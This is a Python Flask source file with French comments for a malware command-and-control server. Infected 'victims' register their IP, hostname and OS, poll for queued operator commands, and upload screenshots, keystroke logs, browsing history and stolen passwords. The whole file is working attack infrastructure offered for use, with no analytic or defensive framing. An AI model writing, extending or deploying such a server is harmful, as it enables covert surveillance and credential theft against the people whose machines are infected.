from flask import Flask, request, jsonify
from flask_cors import CORS
import json
import time
import threading
import base64
from datetime import datetime

app = Flask(__name__)
CORS(app)

# Variables globales
victims = {}       # {id: {"ip": "...", "hostname": "...", "os": "...", "last_seen": timestamp}}
commands = {}      # {victim_id: [{"type": "rainbow", "args": {}}]}
results = {}      # {victim_id: {"screenshot": "base64...", "keylogs": "...", "history": [], "passwords": []}}
next_id = 1

# Nettoyage des victimes offline
def cleanup_offline_victims():
    while True:
        current_time = time.time()
        offline_victims = []
        for victim_id, victim_data in victims.items():
            if current_time - victim_data["last_seen"] > 60:  # 60 secondes sans heartbeat
                offline_victims.append(victim_id)
        
        for victim_id in offline_victims:
            victims.pop(victim_id, None)
            commands.pop(victim_id, None)
            results.pop(victim_id, None)
        
        time.sleep(30)

# Démarrer le thread de nettoyage
cleanup_thread = threading.Thread(target=cleanup_offline_victims, daemon=True)
cleanup_thread.start()

@app.route('/register', methods=['POST'])
def register_victim():
    global next_id
    data = request.json
    victim_id = next_id
    next_id += 1
    
    victims[victim_id] = {
        "ip": data.get("ip", "unknown"),
        "hostname": data.get("hostname", "unknown"),
        "os": data.get("os", "unknown"),
        "last_seen": time.time()
    }
    
    commands[victim_id] = []
    results[victim_id] = {
        "screenshot": "",
        "keylogs": "",
        "history": [],
        "passwords": []
    }
    
    return jsonify({"id": victim_id, "status": "registered"})

@app.route('/heartbeat/<int:victim_id>', methods=['POST'])
def heartbeat(victim_id):
    if victim_id in victims:
        victims[victim_id]["last_seen"] = time.time()
        return jsonify({"status": "ok"})
    return jsonify({"status": "victim not found"}), 404

@app.route('/victims', methods=['GET'])
def get_victims():
    victim_list = []
    current_time = time.time()
    
    for victim_id, victim_data in victims.items():
        is_online = (current_time - victim_data["last_seen"]) < 30
        victim_list.append({
            "id": victim_id,
            "ip": victim_data["ip"],
            "hostname": victim_data["hostname"],
            "os": victim_data["os"],
            "online": is_online,
            "last_seen": datetime.fromtimestamp(victim_data["last_seen"]).strftime('%H:%M:%S')
        })
    
    return jsonify(victim_list)

@app.route('/command/<int:victim_id>', methods=['GET'])
def get_commands(victim_id):
    if victim_id in commands:
        victim_commands = commands[victim_id].copy()
        commands[victim_id] = []  # Vider après récupération
        return jsonify(victim_commands)
    return jsonify([])

@app.route('/command', methods=['POST'])
def send_command():
    data = request.json
    victim_id = data.get("victim_id")
    command_type = data.get("type")
    args = data.get("args", {})
    
    if victim_id in commands:
        commands[victim_id].append({
            "type": command_type,
            "args": args,
            "timestamp": time.time()
        })
        return jsonify({"status": "command queued"})
    return jsonify({"status": "victim not found"}), 404

@app.route('/result', methods=['POST'])
def receive_result():
    data = request.json
    victim_id = data.get("victim_id")
    result_data = data.get("data", {})
    
    if victim_id in results:
        if "screenshot" in result_data:
            results[victim_id]["screenshot"] = result_data["screenshot"]
        if "keylogs" in result_data:
            results[victim_id]["keylogs"] = result_data["keylogs"]
        if "history" in result_data:
            results[victim_id]["history"] = result_data["history"]
        if "passwords" in result_data:
            results[victim_id]["passwords"] = result_data["passwords"]
        
        return jsonify({"status": "result stored"})
    return jsonify({"status": "victim not found"}), 404

@app.route('/result/<int:victim_id>', methods=['GET'])
def get_results(victim_id):
    if victim_id in results:
        return jsonify(results[victim_id])
    return jsonify({"status": "victim not found"}), 404

if __name__ == '__main__':
    app.run(debug=False, host='0.0.0.0', port=5000)
